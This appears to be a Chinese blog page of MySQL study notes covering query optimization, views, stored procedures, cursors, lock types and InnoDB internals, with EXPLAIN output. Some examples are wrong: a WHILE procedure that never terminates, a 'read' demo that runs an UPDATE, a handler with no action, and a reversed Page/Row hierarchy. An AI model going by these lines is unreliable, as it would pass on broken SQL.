<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select id, age, phone from tb_user order by age;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+----------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra          |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+----------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |   100.00 | Using filesort |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+----------------+</span><br></pre></td></tr></table></figure>
<p>例：建立索引，排序查询走Using index</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create index idx_user_age_phone on tb_user(age,phone);</span><br><span class="line">mysql&gt; explain select id, age, phone from tb_user order by age,phone;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key                | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | index | NULL          | idx_user_age_phone | 47      | NULL | 271498 |   100.00 | Using index |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+-------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select id, age, phone from tb_user order by age desc ,phone desc;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+----------------------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key                | key_len | ref  | rows   | filtered | Extra                            |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+----------------------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | index | NULL          | idx_user_age_phone | 47      | NULL | 271498 |   100.00 | Backward index scan; Using index |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+----------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select id, age, phone from tb_user order by age asc ,phone desc;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+-----------------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key                | key_len | ref  | rows   | filtered | Extra                       |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+-----------------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | index | NULL          | idx_user_age_phone | 47      | NULL | 271498 |   100.00 | Using index; Using filesort |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+--------------------+---------+------+--------+----------+-----------------------------+</span><br></pre></td></tr></table></figure>

<p>注:</p>
<ul>
<li>使用排序字段建立合适索引，多字段排序时也遵循最左前缀法则</li>
<li>尽量使用覆盖索引</li>
<li>多字段排序，一个升序一个降序，需指定联合索引创建的规则(ASC&#x2F;DESC)</li>
<li>如果不可避免出现filesort，大数量排序时可适当增加排序缓冲区大小sort_buffer_size(默认256k)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;sort_buffer_size&#x27;;</span><br><span class="line">+------------------+--------+</span><br><span class="line">| Variable_name    | Value  |</span><br><span class="line">+------------------+--------+</span><br><span class="line">| sort_buffer_size | 262144 |</span><br><span class="line">+------------------+--------+</span><br></pre></td></tr></table></figure></li>
</ul>
<h3><span id="group-by优化">group by优化</span></h3><p>先删除所有索引，测试group by查询结果为Using temporary(效率很低)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select profession,count(*) from tb_user group by profession;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-----------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra           |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-----------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |   100.00 | Using temporary |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-----------------+</span><br></pre></td></tr></table></figure>
<p>创建索引后，测试group by查询结果为Using index</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create index idx_pro_age_sta on tb_user(profession,age,status);</span><br><span class="line">mysql&gt; explain select profession,count(*) from tb_user group by profession;</span><br><span class="line">+----+-------------+---------+------------+-------+-----------------+-----------------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys   | key             | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+-------+-----------------+-----------------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | index | idx_pro_age_sta | idx_pro_age_sta | 154     | NULL | 271498 |   100.00 | Using index |</span><br><span class="line">+----+-------------+---------+------------+-------+-----------------+-----------------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h3><span id="limit优化">limit优化</span></h3><p>分页的记录越靠后，查询耗时越大。<br>优化思路：一般分页查询时，通过创建覆盖索引+子查询形式优化。</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_sku order by id limit 9000000,10;</span><br><span class="line">select s.* from tb_sku s, (select id from tb_sku order by id limit 900000,10) a where s.id = a.id;</span><br></pre></td></tr></table></figure>

<h3><span id="count优化">count优化</span></h3><p>表数据量大时, count(*)执行耗时较多</p>
<ul>
<li>count(主键)<br>遍历整张表，把每一行主键id取出来返回给服务层。服务层直接按行累加(无需判断null)。</li>
<li>count(字段)<br>如果没有not null约束，需要把每一行字段值取出来返回给服务层，服务层需判断是否为null，不为null才累加。</li>
<li>count(1)<br>遍历整张表，但不取值。服务层对于返回的每一行，放一个数字’1’进去，直接按行进行累加。</li>
<li>count(*)<br>不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行累加。</li>
</ul>
<p>总结: count(*)效率最高</p>
<h3><span id="update优化">update优化</span></h3><p>更新数据时，一定要根据索引更新，否则会出现锁表的现象。</p>
<p>例: 没有对name建立索引的条件下，以下update语句会锁住整张表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update student set no = &#x27;123&#x27; where name = &#x27;haha&#x27;;</span><br></pre></td></tr></table></figure>

<h2><span id="视图">视图</span></h2><p>视图(View)是一种虚拟存在的表，视图仅保存查询的SQL逻辑，不保存查询结果。</p>
<p>创建视图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create view tb_user_v1 as select id, name from tb_user where id &lt;= 10;</span><br></pre></td></tr></table></figure>
<p>查询视图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_user_v1;</span><br></pre></td></tr></table></figure>
<p>修改视图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter view tb_user_v1 as select id from tb_user where id &lt;= 10;</span><br></pre></td></tr></table></figure>
<p>删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop view tb_user_v1;</span><br></pre></td></tr></table></figure>

<h3><span id="检查选项cascade">检查选项cascade</span></h3><p>视图可以插入数据，通过视图插入的数据不一定能在视图中查询到(比如插入id&gt;10的记录)</p>
<p>例: 创建视图时指定with cascaded check option，可以阻止通过视图插入查不到的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create or replace view tb_user_v1 as select id, name from tb_user where id &lt;= 10 with cascaded check option;</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into tb_user_v1(id,name) values(100,&#x27;hello&#x27;);</span><br><span class="line">ERROR 1369 (HY000): CHECK OPTION failed &#x27;pc.tb_user_v1&#x27;</span><br></pre></td></tr></table></figure>

<h2><span id="存储过程">存储过程</span></h2><h3><span id="创建过程">创建过程</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line">create procedure p1()</span><br><span class="line">begin</span><br><span class="line">	select count(*) from tb_user;</span><br><span class="line">end$$</span><br><span class="line"></span><br><span class="line">delimiter ;</span><br><span class="line">mysql&gt; call p1();</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|   272633 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>

<h3><span id="查看过程">查看过程</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from information_schema.ROUTINES where ROUTINE_SCHEMA = &#x27;itcast&#x27;;</span><br><span class="line">show create procedure 存储过程名称;</span><br></pre></td></tr></table></figure>

<h3><span id="删除过程">删除过程</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop procedure if exists p1;</span><br></pre></td></tr></table></figure>

<h3><span id="变量">变量</span></h3><ul>
<li>全局变量(GLOBAL)</li>
<li>会话变量(SESSION)</li>
</ul>
<h3><span id="查看系统变量">查看系统变量</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show [session|global] variables;</span><br><span class="line">show [session|global] variables like &#x27;...&#x27;;</span><br><span class="line">select @@[session|global].变量;</span><br></pre></td></tr></table></figure>

<h3><span id="设置系统变量">设置系统变量</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set [session|global] 系统变量名=值;</span><br></pre></td></tr></table></figure>
<p>注：</p>
<ul>
<li>未指定session或global时，默认为session,会话级变量</li>
<li>mysql重启后，所设置全局参数会失效，要想不失效，可以在&#x2F;etc&#x2F;my.cnf中配置。</li>
</ul>
<h3><span id="用户定义和使用变量">用户定义和使用变量</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @var_name := expr [, @var_name = expr]; -- 定义变量</span><br><span class="line">select @var_name; -- 使用变量</span><br></pre></td></tr></table></figure>
<p>注：用户定义变量无需对其进行声明或初始化，只不过获取到的值为NULL</p>
<h3><span id="if语句">if语句</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create procedure p3()</span><br><span class="line">begin</span><br><span class="line">	declare score int default 58;</span><br><span class="line">	declare result varchar(10);</span><br><span class="line">	</span><br><span class="line">	if score &gt;= 85 then</span><br><span class="line">		set result := &#x27;优秀&#x27;;</span><br><span class="line">	elseif score &gt;= 60 then</span><br><span class="line">		set result := &#x27;及格&#x27;;</span><br><span class="line">	else</span><br><span class="line">		set result := &#x27;不及格&#x27;;</span><br><span class="line">	end if</span><br><span class="line">	select result;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">call p3();</span><br></pre></td></tr></table></figure>

<h3><span id="参数">参数</span></h3><p>例：入参为分数，出参为(优秀，及格，不及格)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create procedure p4(in score int, out result varchar(10))</span><br><span class="line">begin</span><br><span class="line">	if score &gt;= 85 then</span><br><span class="line">		set result := &#x27;优秀&#x27;;</span><br><span class="line">	elseif score &gt;= 60 then</span><br><span class="line">		set result := &#x27;及格&#x27;;</span><br><span class="line">	else</span><br><span class="line">		set result := &#x27;不及格&#x27;;</span><br><span class="line">	end if</span><br><span class="line">	select result;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">call p4(68, @result);</span><br></pre></td></tr></table></figure>

<h3><span id="case">case</span></h3><p>例：求月份所属季度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create procedure p6(in month int)</span><br><span class="line">begin</span><br><span class="line">	declare result varchar(10);</span><br><span class="line">	</span><br><span class="line">	case</span><br><span class="line">		when month &gt;= 1 and month &lt;= 3 then</span><br><span class="line">			set result := &#x27;第一季度&#x27;;</span><br><span class="line">		when month &gt;= 4 and month &lt;= 6 then</span><br><span class="line">			set result := &#x27;第二季度&#x27;;</span><br><span class="line">		when month &gt;= 7 and month &lt;= 9 then</span><br><span class="line">			set result := &#x27;第三季度&#x27;;</span><br><span class="line">		when month &gt;= 10 and month &lt;= 12 then</span><br><span class="line">			set result := &#x27;第四季度&#x27;;</span><br><span class="line">		else</span><br><span class="line">			set result := &#x27;非法参数&#x27;;</span><br><span class="line">	end case;</span><br><span class="line">	</span><br><span class="line">	select concat(&#x27;输入月份为: &#x27;, month, &#x27;, 所属季度为: &#x27;, result);</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">call p6(4);</span><br></pre></td></tr></table></figure>

<h3><span id="while">while</span></h3><p>例: 计算从1累加到n的和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create procedure p7(in n int)</span><br><span class="line">begin</span><br><span class="line">	declare total int default 0;</span><br><span class="line">	while n&gt;0 do</span><br><span class="line">		set total := total + n;</span><br><span class="line">		set n := n + 1;</span><br><span class="line">	end while;</span><br><span class="line">	select total;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">call p7(10);</span><br></pre></td></tr></table></figure>

<h3><span id="repeat">repeat</span></h3><p>例：计算从1累加到n的和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create procedure p8(in n int)</span><br><span class="line">begin</span><br><span class="line">	declare total int default 0;</span><br><span class="line">	repeat</span><br><span class="line">		set total := total + n;</span><br><span class="line">		set n := n - 1;</span><br><span class="line">	until n &lt;= 0</span><br><span class="line">	end repeat;</span><br><span class="line">	</span><br><span class="line">	select total;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>

<h3><span id="游标cursor">游标(cursor)</span></h3><p>用来存储查询结果集的数据类型</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create procedure p11(in uage int)</span><br><span class="line">begin</span><br><span class="line">	declare u_cursor cursor for select name,profession from tb_user where age &lt;= uage;</span><br><span class="line">	declare uname varchar(100);</span><br><span class="line">	declare upro varchar(100);</span><br><span class="line">	declare exit handler for SQLSTATE &#x27;02000&#x27;;</span><br><span class="line">	</span><br><span class="line">	drop table if exists tb_user_pro;</span><br><span class="line">	create table if not exists tb_user_pro(</span><br><span class="line">		id int primary key auto_increment,</span><br><span class="line">		name varchar(100),</span><br><span class="line">		profession varchar(100)</span><br><span class="line">	);</span><br><span class="line">	open u_cursor;</span><br><span class="line">	while true do</span><br><span class="line">		fetch u_cursor into uname,upro;</span><br><span class="line">		insert into tb_user_pro values(null,uname,upro);</span><br><span class="line">	end while;</span><br><span class="line">	close u_cursor;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">call p11(40);</span><br></pre></td></tr></table></figure>
<h3><span id="存储函数">存储函数</span></h3><p>存储函数是有返回值的存储过程，参数只能是IN类型。</p>
<p>例：从1到n累加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create function fun1(n int)</span><br><span class="line">returns int</span><br><span class="line">begin</span><br><span class="line">	declare total int default 0;</span><br><span class="line">	while n&gt;0 do</span><br><span class="line">		set total := total + n;</span><br><span class="line">		set n := n - 1;</span><br><span class="line">	end while;</span><br><span class="line">	</span><br><span class="line">	return total;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>

<h2><span id="锁重点">锁(重点)</span></h2><p>锁是计算机协调多个进程或线程并发访问某一资源的机制</p>
<ul>
<li>全局锁: 锁定数据库中的所有表</li>
<li>表级锁: 每次操作锁住整张表</li>
<li>行级锁: 每次操作锁住对应的行数据</li>
</ul>
<h3><span id="全局锁">全局锁</span></h3><p>对整个数据库实例加锁，加锁后整个实例处于只读状态，后续的DML写语句，DDL语句都被阻塞。<br>典型的使用场景是做全库的逻辑备份，对所有的表进行锁定，从而获取一致性视图，保证数据的完整性。</p>
<p><strong>全局锁实例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 加全局锁</span></span><br><span class="line">flush <span class="keyword">table</span> <span class="keyword">with</span> read lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 加了全局锁后，可以读</span></span><br><span class="line"><span class="keyword">update</span> tb_user <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;XXX&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1223</span> (HY000): Can<span class="string">&#x27;t execute the query because you have a conflicting read lock</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 但是不能写</span></span><br><span class="line"><span class="string">update tb_user set name = &#x27;</span>XXX<span class="string">&#x27; where id = 1;</span></span><br><span class="line"><span class="string">ERROR 1223 (HY000): Can&#x27;</span>t <span class="keyword">execute</span> the query because you have a conflicting read lock</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 释放锁</span></span><br><span class="line">unlock tables;</span><br></pre></td></tr></table></figure>
<p>注：数据库中加全局锁，是一个比较重的操作，存在以下问题:</p>
<ul>
<li>如果在主库上备份，那么在备份期间都不能更新</li>
<li>如果在从库上备份，那么备份期间从库不能执行主库同步来的二进制日志(binlog)，会导致主从延迟</li>
<li>备份数据库的工具是 mysqldump，加上 –single-transaction 参数，完成不加锁的备份。<br><a href="https://www.cnblogs.com/xiaolincoding/p/16820726.html">https://www.cnblogs.com/xiaolincoding/p/16820726.html</a></li>
</ul>
<h3><span id="表级锁">表级锁</span></h3><p>表级锁分为如下三类</p>
<ul>
<li>表锁</li>
<li>元数据锁 (meta data lock, MDL)</li>
<li>意向锁</li>
</ul>
<h4><span id="表锁">表锁</span></h4><ul>
<li>表共享读锁(read lock)</li>
<li>表独占写锁(write lock)</li>
</ul>
<p><strong>语法</strong><br>加锁: lock tables 表名… read&#x2F;write<br>释放锁: unlock tables (或客户端断开连接时释放锁)</p>
<p><strong>读锁的特点</strong><br>a) 客户端c1加了读锁后，c1和c2都能读，但c1和c2都不能写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; lock tables tb_user read;</span><br><span class="line">mysql&gt; select * from tb_user where id = 1;</span><br><span class="line">+----+-------+-------------+---------------+</span><br><span class="line">| id | name  | phone       | email         |</span><br><span class="line">+----+-------+-------------+---------------+</span><br><span class="line">|  1 | uXrBh | 15847705582 | YYdRR@163.com |</span><br><span class="line">+----+-------+-------------+---------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; update tb_user set name = &#x27;XXX&#x27; where id = 1;</span><br><span class="line">ERROR 1099 (HY000): Table &#x27;tb_user&#x27; was locked with a READ lock and can&#x27;t be updated</span><br><span class="line"></span><br><span class="line">mysql&gt; unlock tables </span><br></pre></td></tr></table></figure>
<p>b) 客户端c1加了写锁后, c1能读也能写，但c2不能读也不能写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 客户端c1</span><br><span class="line">mysql&gt; lock table tb_user write;</span><br><span class="line"></span><br><span class="line">mysql&gt; update tb_user set name = &#x27;XXXXX&#x27; where id = 1;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tb_user where id = 1;</span><br><span class="line">+----+-------+-------------+---------------+------------+------+--------+--------+---------------------+</span><br><span class="line">| id | name  | phone       | email         | profession | age  | gender | status | createtime          |</span><br><span class="line">+----+-------+-------------+---------------+------------+------+--------+--------+---------------------+</span><br><span class="line">|  1 | XXXXX | 15847705582 | YYdRR@163.com | OPS        |   81 | F      |      0 | 2024-08-22 00:00:00 |</span><br><span class="line">+----+-------+-------------+---------------+------------+------+--------+--------+---------------------+</span><br><span class="line"></span><br><span class="line">-- 客户端c2</span><br><span class="line">-- 不能读，被阻塞</span><br><span class="line">mysql&gt; select * from tb_user limit 1;</span><br><span class="line">^C^C -- query aborted</span><br><span class="line">ERROR 1317 (70100): Query execution was interrupted</span><br><span class="line"></span><br><span class="line">-- 不能写，直接报错</span><br><span class="line">mysql&gt; mysql&gt; update tb_user set name = &#x27;XXX&#x27; where id = 1;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;mysql&gt; update tb_user set name = &#x27;XXX&#x27; where id = 1&#x27; at line 1</span><br></pre></td></tr></table></figure>

<h4><span id="元数据锁meta-data-lock-mdl">元数据锁(meta data lock, MDL)</span></h4><ul>
<li>MDL加锁是系统自动控制，无需显式使用，访问一张表时会自动加上。</li>
<li>MDL锁作用是维护表元数据的一致性，表上有活动事务时，不可以对元数据进行写入操作。</li>
<li>MySQL5.5中引入MDL，对一张表进行增删改查时，加MDL读锁(共享), 对表结构进行变更时，加MDL写锁(排他)。避免了DML与DDL的冲突，保证读写正确性。</li>
</ul>
<table>
<thead>
<tr>
<th>对应SQL</th>
<th>锁类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>lock tables xxx read&#x2F;write</td>
<td>SHARED_READ_ONLY&#x2F;SHARED_NO_READ_WRITE</td>
<td></td>
</tr>
<tr>
<td>select, select … lock in share mode</td>
<td>SHARED_READ</td>
<td>与SHARED_READ, SHARED_WRITE兼容, 与EXCLUSIVE互斥</td>
</tr>
<tr>
<td>insert, update, delete, select … for update</td>
<td>SHARED_WRITE</td>
<td>与SHARD_READ, SHARED_WRITE兼容, 与EXCLUSIVE互斥</td>
</tr>
<tr>
<td>alter table …</td>
<td>EXCLUSIVE</td>
<td>与其他MDL互斥</td>
</tr>
</tbody></table>
<p><strong>元数据锁的特点</strong><br>客户端c1开启事务，执行select操作, 客户端c2开启事务，执行alter table操作会阻塞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 客户端c1手动开启事务，执行select操作, 不提交</span><br><span class="line">mysql&gt; begin;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from demo;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 客户端c2开启事务，执行alter table，发现被阻塞 (EXCLUSIVE与SHARED_READ互斥)</span><br><span class="line">mysql&gt; begin;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table demo add column1 int;</span><br><span class="line">b^</span><br></pre></td></tr></table></figure>

<p>查看元数据锁的指令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select object_type,object_schema,object_name,lock_type,lock_duration from performance_schema.metadata_locks;</span><br></pre></td></tr></table></figure>

<h4><span id="意向锁">意向锁</span></h4><p>为了避免DML执行时，加的行锁与表锁冲突，InnoDB引入意向锁，使得表锁不用检查每行数据是否有锁，使用意向锁减少表锁的检查。</p>
<p>意向锁有两种：</p>
<ul>
<li>意向共享锁(IS): 由语句select … lock in share mode添加</li>
<li>意向排他锁(IX): 由insert,update,delete,select … for update添加</li>
</ul>
<p>意向锁兼容性：</p>
<ul>
<li>意向共享锁(IS): 与表锁共享锁兼容，与其他表锁互斥。</li>
<li>意向排他锁(IX): 与表锁共享锁及排它锁都互斥，意向锁之间不会互斥。</li>
</ul>
<p>可以通过以下SQL，查看意向锁及行锁的加锁情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select object_schema,object_name,index_name,lock_type,lock_mode,lock_data from performance_schema.data_locks;</span><br></pre></td></tr></table></figure>

<p>意向锁1实例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 客户端c1开启事务，加IS锁+行锁</span><br><span class="line">mysql&gt;begin;</span><br><span class="line"></span><br><span class="line">mysql&gt;select * from demo where id = 1 lock in share mode;</span><br><span class="line"></span><br><span class="line">mysql&gt; select object_schema,object_name,index_name,lock_type,lock_mode,lock_data from performance_schema.data_locks;</span><br><span class="line">+---------------+-------------+-----------------+-----------+-----------+------------------------+</span><br><span class="line">| object_schema | object_name | index_name      | lock_type | lock_mode | lock_data              |</span><br><span class="line">+---------------+-------------+-----------------+-----------+-----------+------------------------+</span><br><span class="line">| pc            | demo        | NULL            | TABLE     | IS        | NULL                   |</span><br><span class="line">| pc            | demo        | GEN_CLUST_INDEX | RECORD    | S         | supremum pseudo-record |</span><br><span class="line">| pc            | demo        | GEN_CLUST_INDEX | RECORD    | S         | 0x000000000300         |</span><br><span class="line">+---------------+-------------+-----------------+-----------+-----------+------------------------+</span><br><span class="line"></span><br><span class="line">-- 此时,客户端c2可以加表共享读锁，但不能加表排他写锁。</span><br><span class="line">mysql&gt; lock tables demo read;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; unlock tables;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; lock tables demo write;</span><br><span class="line">^C^C -- query aborted</span><br><span class="line">ERROR 1317 (70100): Query execution was interrupted</span><br></pre></td></tr></table></figure>

<h4><span id="行级锁">行级锁</span></h4><p>行级锁，每次操作锁住对应的行数据，锁定粒度最小，发生锁冲突概率最低，并发度最高。应用在InnoDB存储引擎中。<br>行级锁是通过对索引加锁来实现的，不是对记录加锁。行级锁分如下三类：</p>
<ul>
<li>行锁(Record Lock)</li>
<li>间隙锁(Gap Lock)	RR隔离级别下支持</li>
<li>临键锁(Next-Key Lock)</li>
</ul>
<h5><span id="行锁">行锁</span></h5><ul>
<li>共享锁(S):允许一个事务读一行，阻止其他事务获得排它锁。</li>
<li>排它锁(X):允许获取排它锁事务更新数据，阻止其他事务获得相同数据集的共享锁和排他锁。<table>
<thead>
<tr>
<th>SQL</th>
<th>行锁类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>insert</td>
<td>排他锁</td>
<td>自动加锁</td>
</tr>
<tr>
<td>update</td>
<td>排他锁</td>
<td>自动加锁</td>
</tr>
<tr>
<td>delete</td>
<td>排他锁</td>
<td>自动加锁</td>
</tr>
<tr>
<td>select</td>
<td>不加锁</td>
<td></td>
</tr>
<tr>
<td>select … lock in share mode</td>
<td>共享锁</td>
<td>需手动在select之后加lock in share mode</td>
</tr>
<tr>
<td>select … for update</td>
<td>排它锁</td>
<td>需要手动在select之后加for update</td>
</tr>
</tbody></table>
</li>
</ul>
<p>行锁示例：<br>默认情况, InnoDB在Repeatable Read事务隔离级别运行，使用next-key lock进行搜索和索引扫描，防止幻读</p>
<ul>
<li>针对唯一索引进行检索时，对已存在记录进行等值匹配时，自动优化为行锁。</li>
<li>不通过索引条件检索数据，InnoDB将对表中所有记录加锁，此时升级为表锁。</li>
</ul>
<h2><span id="触发器">触发器</span></h2><p>触发器是与表有关的数据库对象，指在insert&#x2F;update&#x2F;delete之前或之后，触发并执行触发器中定义的SQL语句集合。</p>
<table>
<thead>
<tr>
<th>触发器类型</th>
<th>NEW和OLD</th>
</tr>
</thead>
<tbody><tr>
<td>INSERT型触发器</td>
<td>NEW表示将要或者已经新增的数据</td>
</tr>
<tr>
<td>UPDATE型触发器</td>
<td>OLD表示修改之前的数据，NEW表示将要或已经修改后的数据</td>
</tr>
<tr>
<td>DELETE型触发器</td>
<td>OLD表示将要或者已经删除的数据</td>
</tr>
</tbody></table>
<p>– TODO –</p>
<h2><span id="innodb引擎">InnoDB引擎</span></h2><h3><span id="逻辑存储结构">逻辑存储结构</span></h3><p>Tablespace(表空间) -&gt; Segment(段) -&gt; Extent(区) -&gt; Row(行) -&gt; Page(页)</p>
<p>表空间(ibd文件), 一个MySQL示例可对应多个表空间，用于存储记录，索引等数据。<br>段, 分为数据段, 索引段, 回滚段, InnoDB是索引组织表，数据段就是B+树的叶子节点，索引段是B+树的非叶子节点,<br>区，表空间的单元结构，每个区大小为1M, 默认情况，InnoDB页大小为16K, 一个区中有64个连续的页<br>页, InnoDB磁盘管理的最小单元，每个页默认16KB，为保证页连续性，InnoDB每次从磁盘申请4到5个区<br>行, InnoDB数据按行存放。</p>
<p>表空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ls /var/lib/mysql/*.ibd</span><br><span class="line">/var/lib/mysql/mysql.ibd</span><br><span class="line"># ls /var/lib/mysql/pc/</span><br><span class="line">demo.ibd  tb_user.ibd</span><br></pre></td></tr></table></figure>

<h3><span id="架构">架构</span></h3><h4><span id="buffer-pool">Buffer Pool</span></h4><p>缓冲池: 缓存磁盘上经常操作的数据，执行增删改查操作时，先操作Buffer Pool数据(如Buffer Pool没有数据，就从磁盘加载并缓存)，再以一定频率刷到磁盘，从而减少磁盘IO，加快处理速度<br>以页为单位, 底层采用链表管理Page, 根据状态，将Page分为三类：</p>
<ul>
<li>free page 空闲页，未被使用</li>
<li>clean page 被使用页，数据没有被修改过</li>
<li>dirty page 被使用页，数据与磁盘中不一致</li>
</ul>
<h4><span id="change-buffer">Change Buffer</span></h4><p>更改缓冲区，执行DML语句时，如果这些数据Page没有在Buffer Pool中，不会直接操作磁盘，而是将数据变更存到Change Buffer，<br>未来数据被读取时，再将数据合并恢复到Buffer Pool中，再将合并后数据刷新到磁盘中。</p>
<h4><span id="adaptive-hash-index-自适应哈希索引">Adaptive Hash Index (自适应哈希索引)</span></h4><ul>
<li>自适应哈希索引，用于优化对Buffer Pool数据查询。InnoDB会监控对表上各索引页查询，如观察到hash索引可以提升速度，<br>则建立hash索引，称之为自适应hash索引</li>
